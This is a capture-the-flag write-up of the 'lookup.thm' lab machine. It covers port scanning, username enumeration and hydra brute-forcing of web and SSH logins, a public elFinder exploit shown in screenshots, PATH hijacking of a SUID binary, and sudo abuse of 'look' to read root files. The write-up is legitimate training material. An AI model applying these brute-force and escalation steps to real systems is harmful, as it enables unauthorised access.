{% from "macros.html" import console, image, text, code, list, link, header, script, imageModal %}

{{imageModal()}}

{{header("Enumeration", "enumeration")}}

{{text("We start off by scanning all the ports.")}}

{{console("nmap -T5 -p- 10.10.231.140", "Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-24 16:14 CET
Warning: 10.10.231.140 giving up on port because retransmission cap hit (2).
Nmap scan report for lookup.thm (10.10.231.140)
Host is up (0.082s latency).
Not shown: 62276 closed tcp ports (conn-refused), 3257 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 552.74 seconds")}}

{{text("We discover 2 open ports: ")}}

{{list(['22 (SSH)', '80 (HTTP)'])}}

{{text("Going to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>http://10.10.231.140</code> redirects us to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>http://lookup.thm</code>, so we add that entry to our <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/etc/hosts</code> file.")}}

{{text("We can now access the website, which displays a login form.")}}

{{image("../../static/writeups/lookup/images/000001.jpg")}}

{{header("Shell as www-data", "shell-as-www-data")}}

{{text("I tried to scan for different directories and subdomains but didn't find anything. The source code also has nothing interesting.")}}

{{text("I proceeded with analysing the login form. I noticed something vulnerable. When I set username to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>admin</code> instead of getting back <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>Wrong username or password.</code> I got <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>Wrong password.</code>")}}

{{image("../../static/writeups/lookup/images/000002.jpg")}}

{{text("This means the the correct username is <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>admin</code>")}}

{{text("Knowing the username, I began brute-forcing the login form.")}}

{{console("hydra -l admin -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form '/login.php:username=^USER^&password=^PASS^:Wrong password. Please try again.' -t 64", "...
[DATA] attacking http-post-form://lookup.thm:80/login.php:username=^USER^&password=^PASS^:Wrong password. Please try again.
[80][http-post-form] host: lookup.thm   login: admin   password: password123
1 of 1 target successfully completed, 1 valid password found")}}

{{text("We find the password, which is <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>password123</code>. Now we can log in.")}}

{{text("When I tried to log in with those credentials, I once again got back <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>Wrong username or password.</code> which is weird.")}}

{{image("../../static/writeups/lookup/images/000003.jpg")}}

{{text("So it would seem that the username is incorrect after all? I once again ran <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>hydra</code>, now bruteforcing the username.")}}

{{console("hydra -L /usr/share/wordlists/rockyou.txt -p password123 lookup.thm http-post-form '/login.php:username=^USER^&password=^PASS^:Wrong username or password. Please try again.' -t 64", "...
[DATA] attacking http-post-form://lookup.thm:80/login.php:username=^USER^&password=^PASS^:Wrong username or password. Please try again.
[STATUS] 5946.00 tries/min, 5946 tries in 00:01h, 14338453 to do in 40:12h, 64 active
[80][http-post-form] host: lookup.thm   login: jose   password: password123")}}

{{text("We find the correct credentials, which are <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>jose:password123</code>.")}}

{{header("Shell as think", "shell-as-think")}}

{{text("We get redirected to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>http://files.lookup.thm</code> so we have to add this entry to the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/etc/hosts</code> file.")}}

{{text("We see an <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>Elfinder</code> page which is a open-source file manager for web.")}}

{{image("../../static/writeups/lookup/images/000004.jpg")}}

{{text("I tried using credentials from the files, but none seemed to work.")}}

{{text("I found currently used version.")}}

{{image("../../static/writeups/lookup/images/000005.jpg")}}

{{text("I tried searching for any exploits for our version of <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>Elfinder</code> and found this.")}}

{{image("../../static/writeups/lookup/images/000006.jpg")}}

{{text("After choosing the exploit, I set correct options and ran it.")}}

{{image("../../static/writeups/lookup/images/000007.jpg")}}

{{text("We already guessed that there is a user called <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>think</code> from when we looked at the files on the site. In his home directory we find a file called <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>.passwords</code> but we don't have permissions to read it.")}}

{{text("We should search for binaries with <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>SUID</code> bit.")}}

{{console("find / -perm /4000 2>/dev/null", "...
/usr/sbin/pwm
...")}}

{{text("This binary seemed interesting, because I have not seen it before.")}}

{{image("../../static/writeups/lookup/images/000008.jpg")}}

{{text("It executed the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>id</code> command in order to read that user's <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>.passwords</code> file from their directory.")}}

{{text("We can guess that there is no absolute path specified and we can run our own <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>id</code> file.")}}

{{text("I create my own <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>id</code> file in the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>tmp</code> directory that will echo user think <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>id</code> command in order to trick the program to read that user's <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>.passwords</code> file.")}}

{{image("../../static/writeups/lookup/images/000009.jpg")}}

{{text("Command works, and the program reads a file containing a list of potential passwords.")}}

{{text("I copied this file, saved it into a file and began brute-forcing the password.")}}

{{console("hydra -l think -P passwords.txt ssh://10.10.193.239", "...
[DATA] max 16 tasks per 1 server, overall 16 tasks, 49 login tries (l:1/p:49), ~4 tries per task
[DATA] attacking ssh://10.10.193.239:22/
[22][ssh] host: 10.10.193.239   login: think   password: [REDACTED]
1 of 1 target successfully completed, 1 valid password found")}}

{{text("We succesfully brute-force the password, and now are able to log in via SSH.")}}

{{header("Shell as root", "shell-as-root")}}

{{text("Since we know the current user password, first thing I did is check our sudo privilages.")}}

{{console("sudo -l", "Matching Defaults entries for think on lookup:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User think may run the following commands on lookup:
    (ALL) /usr/bin/look")}}

{{text("It seems we can run <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/usr/bin/look</code> as root. Let's try and find a way to privilage escalate using this.")}}

{{link("https://gtfobins.github.io/gtfobins/look/", "https://gtfobins.github.io/assets/logo.png", "look | GTFOBins")}}

{{text("According to this if we run <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/usr/bin/look '' 'FILE'</code> it should read that file.")}}

{{image("../../static/writeups/lookup/images/000010.jpg")}}

{{text("It was successful and we got the flag.")}}

{{script()}}